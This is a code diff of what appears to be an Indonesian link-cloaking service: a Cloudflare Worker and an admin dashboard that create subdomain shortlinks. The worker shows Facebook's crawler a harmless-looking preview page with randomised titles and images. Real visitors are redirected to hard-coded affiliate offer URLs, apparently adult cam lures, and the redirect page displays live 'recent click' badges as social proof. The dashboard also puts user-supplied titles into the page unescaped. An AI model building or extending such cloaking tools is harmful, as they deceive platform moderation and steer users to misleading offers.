@@ -56,7 +56,6 @@ export default {
   }
 };
 
-// SETTINGAN LINK OFFER (Diselaraskan dengan link Anda)
 const OFFER_LINKS = {
   'GACOR': 'https://fdeddg.hubss.one/p/yCTUy',
   'DENNY': 'https://fdeddg.trfsm.com/p/dJbbK',
@@ -106,12 +105,7 @@ async function handleRedirect(req, env, sub, ctx) {
   
   const isFacebookCrawler = /facebookexternalhit|Facebot/i.test(ua);
   const isFacebookApp = /FBAN|FBAV|FB_IAB/i.test(ua);
-  const isInstagramApp = /Instagram/i.test(ua);
-  const isMessengerApp = /Messenger/i.test(ua);
-  const isWhatsApp = /WhatsApp/i.test(ua);
   
-  const isRealUser = isFacebookApp || isInstagramApp || isMessengerApp || isWhatsApp || !isFacebookCrawler;
-
   ctx.waitUntil(updateStats(env, sub, country, data.offerId));
 
   if (isFacebookCrawler && !isFacebookApp) {
@@ -138,7 +132,6 @@ async function handleCreate(req, env) {
   try {
     const body = await req.json();
     const sub = body.customCode ? body.customCode.toLowerCase().trim() : Math.random().toString(36).substring(2, 8);
-    
     const offerId = body.offerId || 'CUSTOM';
     
     let targetUrl = body.targetUrl;
@@ -147,23 +140,19 @@ async function handleCreate(req, env) {
     }
     
     if (!targetUrl) {
-      return json({ error: 'URL Tujuan wajib diisi (atau pilih Offer ID yang valid)' }, 400);
+      return json({ error: 'URL Tujuan tidak ditemukan' }, 400);
     }
 
     if (await env.LINKS_DB.get(`link:${sub}`)) {
       return json({ error: 'Subdomain sudah ada' }, 409);
     }
 
-    const title = body.title?.trim() || getRandom(DEFAULT_TITLES);
-    const description = body.description?.trim() || getRandom(DEFAULT_DESCS);
-    const imageUrl = body.imageUrl?.trim() || getRandom(DEFAULT_IMAGES);
-
     const data = {
       subdomain: sub,
       domain: body.domain,
-      title: title,
-      description: description,
-      imageUrl: imageUrl,
+      title: body.title?.trim() || getRandom(DEFAULT_TITLES),
+      description: body.description?.trim() || getRandom(DEFAULT_DESCS),
+      imageUrl: body.imageUrl?.trim() || getRandom(DEFAULT_IMAGES),
       targetUrl: targetUrl,
       offerId: offerId,
       clicks: 0,
@@ -222,11 +211,7 @@ async function updateStats(env, sub, country, offerId) {
     
     const recentRaw = await env.LINKS_DB.get(`clicks:${sub}`);
     let recent = recentRaw ? JSON.parse(recentRaw) : [];
-    recent.push({
-      country: country,
-      offerId: offerId || 'UNKNOWN',
-      time: Date.now()
-    });
+    recent.push({ country: country, offerId: offerId || 'UNKNOWN', time: Date.now() });
     recent = recent.filter(c => Date.now() - c.time < 300000).slice(-20);
     await env.LINKS_DB.put(`clicks:${sub}`, JSON.stringify(recent));
   } catch (e) {
@@ -252,48 +237,32 @@ function getRedirectHTML(url, sub, env) {
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
         .dots{display:flex;gap:4px;height:4px;align-items:center}
         .dot{width:4px;height:4px;background:#1877f2;border-radius:50%;animation:bounce 1.4s infinite ease-in-out both;opacity:0.6}
-        .dot:nth-child(1){animation-delay:-0.32s}
-        .dot:nth-child(2){animation-delay:-0.16s}
+        .dot:nth-child(1){animation-delay:-0.32s}.dot:nth-child(2){animation-delay:-0.16s}
         @keyframes bounce{0%,80%,100%{transform:scale(0.6)}40%{transform:scale(1)}}
         p{color:#65676b;font-size:14px;font-weight:500;letter-spacing:0.5px;margin-top:4px}
-        
         .floating-tracker{position:fixed;bottom:10px;right:10px;width:140px;height:100%;pointer-events:none;z-index:5;overflow:hidden}
-        .track-item{position:absolute;right:0;font-size:10px;background:rgba(24,119,242,0.85);color:white;padding:3px 8px;border-radius:12px;white-space:nowrap;opacity:0;animation:floatUp 4s ease-out forwards;display:flex;align-items:center;gap:4px;box-shadow:0 2px 8px rgba(0,0,0,0.1);backdrop-filter:blur(4px)}
-        .track-item .flag{font-size:12px}
-        @keyframes floatUp{
-            0%{transform:translateY(0) translateX(0);opacity:0}
-            10%{transform:translateY(-20px) translateX(-5px);opacity:0.9}
-            90%{transform:translateY(-80vh) translateX(-15px);opacity:0.6}
-            100%{transform:translateY(-100vh) translateX(-20px);opacity:0}
-        }
+        .track-item{position:absolute;right:0;font-size:10px;background:rgba(24,119,242,0.85);color:white;padding:3px 8px;border-radius:12px;white-space:nowrap;opacity:0;animation:floatUp 4s ease-out forwards;display:flex;align-items:center;gap:4px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
+        @keyframes floatUp{0%{transform:translateY(0) translateX(0);opacity:0}10%{transform:translateY(-20px) translateX(-5px);opacity:0.9}90%{transform:translateY(-80vh) translateX(-15px);opacity:0.6}100%{transform:translateY(-100vh) translateX(-20px);opacity:0}}
     </style>
     <script>
-        setTimeout(function(){
-            window.location.href = "${cleanUrl}";
-        }, 1000);
-        document.addEventListener('click', function(){
-            window.location.href = "${cleanUrl}";
-        });
-        
+        setTimeout(()=>window.location.href="${cleanUrl}",1000);
+        document.addEventListener('click',()=>window.location.href="${cleanUrl}");
         async function loadRecentClicks(){
             try{
-                const res = await fetch('/api/recent-clicks?sub=${sub}');
-                const data = await res.json();
-                if(data.success && data.data.length > 0){
-                    const container = document.createElement('div');
-                    container.className = 'floating-tracker';
+                const res=await fetch('/api/recent-clicks?sub=${sub}');
+                const data=await res.json();
+                if(data.success&&data.data.length>0){
+                    const container=document.createElement('div');
+                    container.className='floating-tracker';
                     document.body.appendChild(container);
-                    
-                    data.data.slice(-5).reverse().forEach((click, idx) => {
-                        setTimeout(() => {
-                            const item = document.createElement('div');
-                            item.className = 'track-item';
-                            item.style.animationDelay = (idx * 0.5) + 's';
-                            item.innerHTML = '<span class="flag">🌍</span> ' + (click.offerId || 'LINK') + ' • ' + click.country;
-                            item.style.bottom = '10px';
+                    data.data.slice(-5).reverse().forEach((click,idx)=>{
+                        setTimeout(()=>{
+                            const item=document.createElement('div');
+                            item.className='track-item';
+                            item.innerHTML='<span>🌍</span> '+(click.offerId||'LINK')+' • '+click.country;
                             container.appendChild(item);
-                            setTimeout(() => item.remove(), 4000);
-                        }, idx * 800);
+                            setTimeout(()=>item.remove(),4000);
+                        },idx*800);
                     });
                 }
             }catch(e){}
@@ -304,11 +273,7 @@ function getRedirectHTML(url, sub, env) {
 <body>
     <div class="loader" onclick="window.location.href='${cleanUrl}'">
         <div class="spinner"></div>
-        <div class="dots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
+        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
         <p>Loading...</p>
     </div>
 </body>
@@ -322,41 +287,20 @@ function getOgHTML(d, sub) {
   const domain = d.domain || '';
   
   return `<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>${title}</title>
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="${title}">
-    <meta property="og:description" content="${desc}">
-    <meta property="og:image" content="${img}">
-    <meta property="og:url" content="https://${sub}.${domain}/">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:site_name" content="${domain}">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="${title}">
-    <meta name="twitter:description" content="${desc}">
-    <meta name="twitter:image" content="${img}">
-</head>
-<body>
-    <h1>${title}</h1>
-    <p>${desc}</p>
-    <img src="${img}" alt="${title}" style="max-width:100%">
-</body>
-</html>`;
+<html lang="id"><head><meta charset="UTF-8">
+<meta property="og:title" content="${title}">
+<meta property="og:description" content="${desc}">
+<meta property="og:image" content="${img}">
+<meta property="og:url" content="https://${sub}.${domain}/">
+<title>${title}</title>
+</head><body><h1>${title}</h1><p>${desc}</p><img src="${img}" alt="${title}"></body></html>`;
 }
 
 function getDashboardHTML(domains) {
   const options = domains.map(d => `<option value="${d}">${d}</option>`).join('');
-  
-  // DHAPUS SEMUA ICON DARI OPTIONS - TINGGAL NAMA SAJA
   const offerOptions = Object.keys(OFFER_LINKS)
     .filter(k => k !== 'CUSTOM')
-    .map(k => {
-      return `<option value="${k}">${k}</option>`;
-    }).join('');
+    .map(k => `<option value="${k}">${k}</option>`).join('');
   
   return `<!DOCTYPE html>
 <html lang="id">
@@ -365,211 +309,615 @@ function getDashboardHTML(domains) {
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Manager Link Pro</title>
 <style>
-  body{font-family:-apple-system,sans-serif;background:#f0f2f5;padding:15px;max-width:500px;margin:0 auto}
-  .card{background:#fff;padding:20px;border-radius:10px;box-shadow:0 2px 4px rgba(0,0,0,0.1);margin-bottom:15px}
-  input,select,textarea{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
-  button{background:#1877f2;color:#fff;border:none;padding:12px;border-radius:8px;width:100%;cursor:pointer;font-weight:bold}
-  .link-item{padding:12px;border-bottom:1px solid #eee;display:flex;flex-direction:column;gap:5px}
-  .actions{display:flex;gap:8px;margin-top:5px}
-  .btn-c{background:#42b72a;flex:1}.btn-d{background:#f02849;width:70px}
-  #dashboard{display:none}
-  .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}
-  .logout-btn{background:#f02849;width:auto;padding:8px 16px;font-size:12px;width:80px}
-  .copyright{text-align:center;color:#8a8d91;font-size:11px;margin-top:20px;padding-top:15px;border-top:1px solid #e4e6eb}
-  .offer-badge{display:inline-block;background:#1877f2;color:white;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:bold;margin-right:5px}
-  .offer-select{background:#f0f2f5;font-weight:600;color:#1877f2;border:2px solid #1877f2}
-  .url-display{background:#e7f3ff;padding:10px;border-radius:6px;font-size:12px;color:#1877f2;word-break:break-all;margin:8px 0;border-left:3px solid #1877f2}
-  .hidden{display:none}
+  :root{
+    --primary:#1877f2;
+    --primary-dark:#166fe5;
+    --danger:#f02849;
+    --success:#42b72a;
+    --bg:#f0f2f5;
+    --card-bg:#fff;
+    --text:#1c1e21;
+    --text-secondary:#65676b;
+    --border:#ddd;
+    --shadow:0 2px 12px rgba(0,0,0,0.1);
+    --radius:12px;
+    --radius-sm:8px;
+  }
+  
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  body{background:var(--bg);color:var(--text);line-height:1.6;min-height:100vh}
+  
+  /* LAYOUT CONTAINER */
+  .app-container{max-width:1400px;margin:0 auto;display:flex;min-height:100vh}
+  
+  /* SIDEBAR - Desktop only */
+  .sidebar{
+    width:260px;
+    background:var(--card-bg);
+    border-right:1px solid var(--border);
+    padding:24px 16px;
+    position:fixed;
+    height:100vh;
+    overflow-y:auto;
+    z-index:100;
+    display:none;
+  }
+  .sidebar-logo{
+    font-size:24px;
+    font-weight:800;
+    color:var(--primary);
+    margin-bottom:32px;
+    padding:0 8px;
+    letter-spacing:-0.5px
+  }
+  .nav-item{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    padding:12px 16px;
+    margin:4px 0;
+    border-radius:var(--radius-sm);
+    color:var(--text-secondary);
+    text-decoration:none;
+    font-weight:600;
+    font-size:15px;
+    transition:all 0.2s;
+    cursor:pointer;
+  }
+  .nav-item:hover,.nav-item.active{background:var(--bg);color:var(--primary)}
+  .nav-item svg{width:20px;height:20px}
+  .sidebar-footer{
+    position:absolute;
+    bottom:24px;
+    left:16px;
+    right:16px;
+    font-size:12px;
+    color:var(--text-secondary);
+    text-align:center;
+  }
+  
+  /* MAIN CONTENT */
+  .main-content{
+    flex:1;
+    margin-left:0;
+    padding:16px;
+    width:100%;
+    padding-bottom:80px;
+  }
+  
+  /* MOBILE HEADER */
+  .mobile-header{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:12px 16px;
+    background:var(--card-bg);
+    margin:-16px -16px 16px -16px;
+    border-bottom:1px solid var(--border);
+    position:sticky;
+    top:0;
+    z-index:99;
+  }
+  .mobile-title{font-size:20px;font-weight:800;color:var(--primary)}
+  
+  /* CARDS */
+  .card{
+    background:var(--card-bg);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow);
+    padding:20px;
+    margin-bottom:20px;
+  }
+  .card-title{
+    font-size:18px;
+    font-weight:700;
+    margin-bottom:20px;
+    color:var(--text);
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+  }
+  .card-subtitle{font-size:13px;color:var(--text-secondary);font-weight:500;margin-top:4px}
+  
+  /* FORM ELEMENTS */
+  .form-group{margin-bottom:16px}
+  label{
+    display:block;
+    font-size:13px;
+    font-weight:600;
+    color:var(--text-secondary);
+    margin-bottom:6px;
+    text-transform:uppercase;
+    letter-spacing:0.3px
+  }
+  input,select,textarea{
+    width:100%;
+    padding:12px 16px;
+    border:1px solid var(--border);
+    border-radius:var(--radius-sm);
+    font-size:15px;
+    background:var(--card-bg);
+    transition:all 0.2s;
+    min-height:44px;
+  }
+  input:focus,select:focus,textarea:focus{
+    outline:none;
+    border-color:var(--primary);
+    box-shadow:0 0 0 3px rgba(24,119,242,0.1);
+  }
+  select{cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2365676b' d='M6 9L1 4h10z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 16px center;padding-right:40px}
+  textarea{resize:vertical;min-height:80px}
+  
+  /* GRID LAYOUTS */
+  .form-row{display:grid;grid-template-columns:1fr;gap:16px}
+  
+  /* BUTTONS */
+  .btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    padding:12px 24px;
+    border:none;
+    border-radius:var(--radius-sm);
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    transition:all 0.2s;
+    min-height:44px;
+    width:100%;
+  }
+  .btn-primary{background:var(--primary);color:#fff}
+  .btn-primary:hover{background:var(--primary-dark);transform:translateY(-1px)}
+  .btn-primary:active{transform:translateY(0)}
+  .btn-success{background:var(--success);color:#fff}
+  .btn-danger{background:var(--danger);color:#fff}
+  .btn-sm{padding:8px 16px;font-size:13px}
+  .btn-logout{
+    background:transparent;
+    color:var(--danger);
+    border:1px solid var(--danger);
+    padding:8px 16px;
+    font-size:13px;
+    width:auto;
+  }
+  
+  /* OFFER BADGE */
+  .offer-select{
+    background:linear-gradient(135deg,#f0f2f5 0%,#e4e6eb 100%);
+    color:var(--primary);
+    font-weight:700;
+    border:2px solid var(--primary);
+  }
+  .offer-badge{
+    display:inline-flex;
+    align-items:center;
+    background:var(--primary);
+    color:#fff;
+    padding:4px 12px;
+    border-radius:20px;
+    font-size:12px;
+    font-weight:700;
+    letter-spacing:0.5px
+  }
+  
+  /* LINK ITEMS GRID */
+  .links-grid{
+    display:grid;
+    grid-template-columns:1fr;
+    gap:16px;
+  }
+  .link-item{
+    background:var(--card-bg);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    padding:16px;
+    display:flex;
+    flex-direction:column;
+    gap:8px;
+    transition:all 0.2s;
+    position:relative;
+    overflow:hidden;
+  }
+  .link-item:hover{
+    box-shadow:0 4px 20px rgba(0,0,0,0.1);
+    transform:translateY(-2px);
+  }
+  .link-header{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    flex-wrap:wrap;
+  }
+  .link-title{
+    font-weight:700;
+    font-size:15px;
+    color:var(--text);
+    flex:1;
+    min-width:0;
+    overflow:hidden;
+    text-overflow:ellipsis;
+    white-space:nowrap;
+  }
+  .link-url{
+    font-size:13px;
+    color:var(--primary);
+    background:rgba(24,119,242,0.1);
+    padding:4px 12px;
+    border-radius:20px;
+    font-weight:600;
+    word-break:break-all;
+  }
+  .link-meta{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    font-size:12px;
+    color:var(--text-secondary);
+    margin-top:4px;
+  }
+  .link-actions{
+    display:grid;
+    grid-template-columns:1fr auto;
+    gap:8px;
+    margin-top:8px;
+  }
+  
+  /* LOGIN FORM */
+  .login-container{
+    max-width:400px;
+    margin:80px auto;
+    padding:0 20px;
+  }
+  .login-card{
+    background:var(--card-bg);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow);
+    padding:40px 32px;
+    text-align:center;
+  }
+  .login-logo{
+    font-size:32px;
+    font-weight:800;
+    color:var(--primary);
+    margin-bottom:8px;
+  }
+  .login-subtitle{color:var(--text-secondary);margin-bottom:32px;font-size:15px}
+  
+  /* UTILITIES */
+  .hidden{display:none!important}
+  .text-center{text-align:center}
+  .mt-1{margin-top:8px}
+  .mt-2{margin-top:16px}
+  .mb-2{margin-bottom:16px}
+  
+  /* DESKTOP BREAKPOINTS */
+  @media(min-width:768px){
+    .main-content{padding:24px 32px;padding-bottom:40px}
+    .form-row{grid-template-columns:repeat(2,1fr)}
+    .links-grid{grid-template-columns:repeat(auto-fill,minmax(300px,1fr))}
+  }
+  
+  @media(min-width:1024px){
+    .sidebar{display:block}
+    .main-content{margin-left:260px;padding:32px 40px}
+    .mobile-header{display:none}
+    .btn{width:auto}
+    .btn-full{width:100%}
+    .link-actions{grid-template-columns:1fr 80px}
+  }
+  
+  @media(min-width:1280px){
+    .links-grid{grid-template-columns:repeat(3,1fr)}
+  }
+  
+  /* TOAST NOTIFICATION */
+  .toast{
+    position:fixed;
+    bottom:24px;
+    right:24px;
+    background:var(--text);
+    color:#fff;
+    padding:16px 24px;
+    border-radius:var(--radius-sm);
+    box-shadow:0 4px 20px rgba(0,0,0,0.3);
+    z-index:1000;
+    transform:translateY(100px);
+    opacity:0;
+    transition:all 0.3s;
+  }
+  .toast.show{transform:translateY(0);opacity:1}
 </style>
 </head>
 <body>
-  <div id="login" class="card">
-    <h3 style="margin-top:0">Admin Login</h3>
-    <input type="password" id="pass" placeholder="Password Admin">
-    <button onclick="doLogin()">Masuk</button>
-  </div>
-  <div id="dashboard">
-    <div class="header">
-      <h3 style="margin:0">Dashboard</h3>
-      <button class="logout-btn" onclick="doLogout()">Logout</button>
+
+<!-- LOGIN VIEW -->
+<div id="loginView" class="login-container">
+  <div class="login-card">
+    <div class="login-logo">Link Manager</div>
+    <div class="login-subtitle">Tools by Sesepuh</div>
+    <div class="form-group">
+      <input type="password" id="pass" placeholder="Masukkan Password Admin" onkeypress="if(event.key==='Enter')doLogin()">
     </div>
-    <div class="card">
-      <h3 style="margin-top:0">Buat Link Baru</h3>
-      
-      <label style="font-size:12px;color:#65676b;font-weight:600">Pilih Offer ID:</label>
-      <select id="offerId" class="offer-select" onchange="handleOfferChange()">
-        ${offerOptions}
-        <option value="CUSTOM">CUSTOM (Input Manual)</option>
-      </select>
-      
-      <div id="urlDisplay" class="url-display" style="display:none">
-        <strong>Link Target:</strong><br>
-        <span id="targetUrlText">-</span>
+    <button class="btn btn-primary btn-full" onclick="doLogin()">Masuk Dashboard</button>
+  </div>
+</div>
+
+<!-- MAIN APP -->
+<div id="appView" class="app-container hidden">
+  <!-- Sidebar Desktop -->
+  <nav class="sidebar">
+    <div class="sidebar-logo">Link Manager</div>
+    <a class="nav-item active" onclick="showSection('create')">
+      <span>Buat Link</span>
+    </a>
+    <a class="nav-item" onclick="showSection('list')">
+      <span>Riwayat Link</span>
+    </a>
+    <div class="sidebar-footer">
+      Tools by Sesepuh © 2025<br>
+      <span style="font-size:11px;opacity:0.7">v2.0 Responsive</span>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <!-- Mobile Header -->
+    <header class="mobile-header">
+      <span class="mobile-title">Link Manager</span>
+      <button class="btn btn-logout btn-sm" onclick="doLogout()">Logout</button>
+    </header>
+
+    <!-- Create Section -->
+    <section id="createSection" class="section">
+      <div class="card">
+        <div class="card-title">
+          <div>
+            Buat Link Baru
+            <div class="card-subtitle">Generate shortlink dengan preset offer</div>
+          </div>
+        </div>
+        
+        <div class="form-row">
+          <div class="form-group">
+            <label>Pilih Offer ID</label>
+            <select id="offerId" class="offer-select" onchange="handleOfferChange()">
+              ${offerOptions}
+              <option value="CUSTOM">CUSTOM (Manual)</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Domain</label>
+            <select id="dom">${options}</select>
+          </div>
+        </div>
+
+        <div id="customUrlGroup" class="form-group hidden">
+          <label>URL Tujuan Custom</label>
+          <input type="url" id="target" placeholder="https://example.com/offer">
+        </div>
+
+        <div class="form-group">
+          <label>Judul Postingan <span style="font-weight:400;color:var(--text-secondary)">(Opsional - Auto Random)</span></label>
+          <input type="text" id="t" placeholder="Contoh: HI! I'M ANGEL - ON LIVE SHOWS!">
+        </div>
+
+        <div class="form-group">
+          <label>Deskripsi <span style="font-weight:400;color:var(--text-secondary)">(Opsional - Auto Random)</span></label>
+          <textarea id="desc" placeholder="Contoh: 673.829 Online Members"></textarea>
+        </div>
+
+        <div class="form-group">
+          <label>URL Gambar <span style="font-weight:400;color:var(--text-secondary)">(Opsional - Auto Random)</span></label>
+          <input type="url" id="img" placeholder="https://example.com/image.jpg">
+        </div>
+
+        <div class="form-group">
+          <label>Custom Subdomain <span style="font-weight:400;color:var(--text-secondary)">(Opsional)</span></label>
+          <input type="text" id="code" placeholder="promo-gacor">
+        </div>
+
+        <button class="btn btn-primary btn-full" onclick="create()" id="btn">Generate & Salin Link</button>
       </div>
-      
-      <input type="url" id="target" class="hidden" placeholder="URL Tujuan (Untuk mode CUSTOM)">
-      
-      <input type="text" id="t" placeholder="Judul Postingan (Auto Random jika kosong)">
-      <textarea id="desc" placeholder="Deskripsi (Auto Random jika kosong)"></textarea>
-      <input type="url" id="img" placeholder="URL Gambar (Auto Random jika kosong)">
-      
-      <select id="dom">${options}</select>
-      <input type="text" id="code" placeholder="Custom Subdomain (Opsional)">
-      <button onclick="create()" id="btn">Generate & Salin Link</button>
+    </section>
+
+    <!-- List Section -->
+    <section id="listSection" class="section hidden">
+      <div class="card">
+        <div class="card-title">
+          <div>
+            Riwayat Link
+            <div class="card-subtitle">Semua link yang telah dibuat</div>
+          </div>
+          <button class="btn btn-primary btn-sm" onclick="showSection('create')">+ Baru</button>
+        </div>
+        <div id="linksContainer" class="links-grid">
+          <div class="text-center mt-2" style="color:var(--text-secondary)">Memuat data...</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Copyright Mobile -->
+    <div class="text-center mt-2" style="color:var(--text-secondary);font-size:12px;padding-bottom:20px;display:block;lg:none">
+      Tools by Sesepuh © 2025
     </div>
-    <div class="card">
-      <h3 style="margin-top:0">Riwayat Link</h3>
-      <div id="list">Memuat...</div>
-    </div>
-    <div class="copyright">Tools by Sesepuh © 2025</div>
-  </div>
+  </main>
+</div>
+
+<div id="toast" class="toast"></div>
+
 <script>
-  // SYNC DENGAN BACKEND OFFER_LINKS
-  const OFFER_URLS = {
-    'GACOR': 'https://fdeddg.hubss.one/p/yCTUy',
-    'DENNY': 'https://fdeddg.trfsm.com/p/dJbbK',
-    'RONGGOLAWE': 'https://fdeddg.hubss.one/p/7vKE6',
-    'PENTOLKOREK': 'https://fdeddg.trfsm.com/p/zyPld',
-    'KLOWOR': 'https://fdeddg.hubss.one/p/A8Se6',
-    'DENNOK': 'https://fdeddg.hubss.one/p/ylgz0',
-    'CUSTOM': ''
+let k = localStorage.getItem('k');
+if(k) showApp();
+
+function showToast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),3000);
+}
+
+function doLogin(){
+  k = document.getElementById('pass').value;
+  if(!k){showToast('Password wajib diisi');return;}
+  localStorage.setItem('k', k);
+  showApp();
+}
+
+function doLogout(){
+  localStorage.removeItem('k');
+  location.reload();
+}
+
+function showApp(){
+  document.getElementById('loginView').classList.add('hidden');
+  document.getElementById('appView').classList.remove('hidden');
+  showSection('create');
+  load();
+}
+
+function showSection(name){
+  document.getElementById('createSection').classList.toggle('hidden',name!=='create');
+  document.getElementById('listSection').classList.toggle('hidden',name!=='list');
+  document.querySelectorAll('.nav-item').forEach((el,idx)=>{
+    el.classList.toggle('active',(name==='create'&&idx===0)||(name==='list'&&idx===1));
+  });
+  if(name==='list')load();
+}
+
+function handleOfferChange(){
+  const isCustom = document.getElementById('offerId').value==='CUSTOM';
+  document.getElementById('customUrlGroup').classList.toggle('hidden',!isCustom);
+}
+
+async function create(){
+  const btn=document.getElementById('btn');
+  const originalText=btn.textContent;
+  btn.textContent='Memproses...';
+  btn.disabled=true;
+  
+  const offerId=document.getElementById('offerId').value;
+  let targetUrl='';
+  
+  if(offerId==='CUSTOM'){
+    targetUrl=document.getElementById('target').value;
+    if(!targetUrl){
+      showToast('URL Custom wajib diisi');
+      btn.textContent=originalText;
+      btn.disabled=false;
+      return;
+    }
+  }
+  
+  const payload={
+    title:document.getElementById('t').value,
+    description:document.getElementById('desc').value,
+    imageUrl:document.getElementById('img').value,
+    targetUrl:targetUrl,
+    domain:document.getElementById('dom').value,
+    customCode:document.getElementById('code').value,
+    offerId:offerId
   };
   
-  let k = localStorage.getItem('k');
-  if(k) showDash();
-  
-  function doLogin(){
-    k = document.getElementById('pass').value;
-    localStorage.setItem('k', k);
-    showDash();
-  }
-  function doLogout(){
-    localStorage.removeItem('k');
-    location.reload();
-  }
-  function showDash(){
-    document.getElementById('login').style.display='none';
-    document.getElementById('dashboard').style.display='block';
-    handleOfferChange();
-    load();
-  }
-  
-  function handleOfferChange(){
-    const offerId = document.getElementById('offerId').value;
-    const urlDisplay = document.getElementById('urlDisplay');
-    const targetInput = document.getElementById('target');
-    const targetText = document.getElementById('targetUrlText');
-    
-    if(offerId === 'CUSTOM'){
-      urlDisplay.style.display = 'none';
-      targetInput.className = '';
-      targetInput.required = true;
-    } else {
-      targetInput.className = 'hidden';
-      targetInput.required = false;
-      urlDisplay.style.display = 'block';
-      targetText.textContent = OFFER_URLS[offerId] || '-';
-    }
-  }
-  
-  async function create(){
-    const b = document.getElementById('btn');
-    b.innerText = 'Memproses...';
-    
-    const offerId = document.getElementById('offerId').value;
-    let targetUrl = '';
-    
-    if(offerId === 'CUSTOM'){
-      targetUrl = document.getElementById('target').value;
-      if(!targetUrl){
-        alert('URL Tujuan wajib diisi untuk mode CUSTOM');
-        b.innerText = 'Generate & Salin Link';
-        return;
-      }
-    }
-    
-    const payload = {
-      title: document.getElementById('t').value,
-      description: document.getElementById('desc').value,
-      imageUrl: document.getElementById('img').value,
-      targetUrl: targetUrl,
-      domain: document.getElementById('dom').value,
-      customCode: document.getElementById('code').value,
-      offerId: offerId
-    };
-    
-    const res = await fetch('/api/create', {
-      method: 'POST',
-      headers: {'Authorization': 'Bearer '+k, 'Content-Type': 'application/json'},
-      body: JSON.stringify(payload)
+  try{
+    const res=await fetch('/api/create',{
+      method:'POST',
+      headers:{'Authorization':'Bearer '+k,'Content-Type':'application/json'},
+      body:JSON.stringify(payload)
     });
     
     if(res.ok){
-      const data = await res.json();
-      copy(data.url);
-      alert('Berhasil! Link tersalin otomatis:\\n' + data.url);
-      load();
+      const data=await res.json();
+      copyToClipboard(data.url);
+      showToast('Link berhasil dibuat & disalin!');
       document.getElementById('t').value='';
       document.getElementById('desc').value='';
       document.getElementById('img').value='';
       document.getElementById('target').value='';
       document.getElementById('code').value='';
-    } else {
-      const err = await res.json();
-      alert('Gagal: ' + (err.error || 'Password salah'));
-      if(res.status === 401) { localStorage.removeItem('k'); location.reload(); }
+      setTimeout(()=>showSection('list'),500);
+    }else{
+      const err=await res.json();
+      showToast('Gagal: '+err.error);
+      if(res.status===401){localStorage.removeItem('k');location.reload();}
     }
-    b.innerText = 'Generate & Salin Link';
+  }catch(e){
+    showToast('Error: '+e.message);
   }
   
-  async function load(){
-    const res = await fetch('/api/list', {headers: {'Authorization': 'Bearer '+k}});
-    if(res.status === 401) { localStorage.removeItem('k'); location.reload(); return; }
-    const d = await res.json();
-    if(d.success){
-      // DHAPUS ICON 🎯 DAN 👁 DARI DISPLAY
-      document.getElementById('list').innerHTML = d.data.map(i => \`
+  btn.textContent=originalText;
+  btn.disabled=false;
+}
+
+async function load(){
+  const container=document.getElementById('linksContainer');
+  try{
+    const res=await fetch('/api/list',{headers:{'Authorization':'Bearer '+k}});
+    if(res.status===401){localStorage.removeItem('k');location.reload();return;}
+    const d=await res.json();
+    
+    if(d.success&&d.data.length>0){
+      container.innerHTML=d.data.map(i=>{
+        const date=new Date(i.createdAt).toLocaleDateString('id-ID',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'});
+        return \`
         <div class="link-item">
-          <div style="display:flex;align-items:center;gap:5px;flex-wrap:wrap">
-            <span class="offer-badge">\${i.offerId || 'LINK'}</span>
-            <strong>\${i.title}</strong>
+          <div class="link-header">
+            <span class="offer-badge">\${i.offerId}</span>
+            <span class="link-title" title="\${i.title}">\${i.title}</span>
           </div>
-          <span style="font-size:12px;color:#1877f2">https://\${i.subdomain}.\${i.domain}</span>
-          <div style="font-size:10px;color:#8a8d91;margin-top:2px">
-            \${i.offerId} • \${i.clicks || 0} klik
+          <div class="link-url">\${i.subdomain}.\${i.domain}</div>
+          <div class="link-meta">
+            <span>\${date}</span>
+            <span style="font-weight:600;color:var(--text)">\${i.clicks||0} klik</span>
           </div>
-          <div class="actions">
-            <button class="btn-c" onclick="copy('https://\${i.subdomain}.\${i.domain}')">Salin</button>
-            <button class="btn-d" onclick="del('\${i.subdomain}')">Hapus</button>
+          <div class="link-actions">
+            <button class="btn btn-success btn-sm" onclick="copyToClipboard('https://\${i.subdomain}.\${i.domain}')">Salin Link</button>
+            <button class="btn btn-danger btn-sm" onclick="deleteLink('\${i.subdomain}')">Hapus</button>
           </div>
         </div>
-      \`).join('') || 'Belum ada link.';
+        \`;
+      }).join('');
+    }else{
+      container.innerHTML='<div class="text-center mt-2" style="color:var(--text-secondary);grid-column:1/-1">Belum ada link. Buat link pertama Anda!</div>';
     }
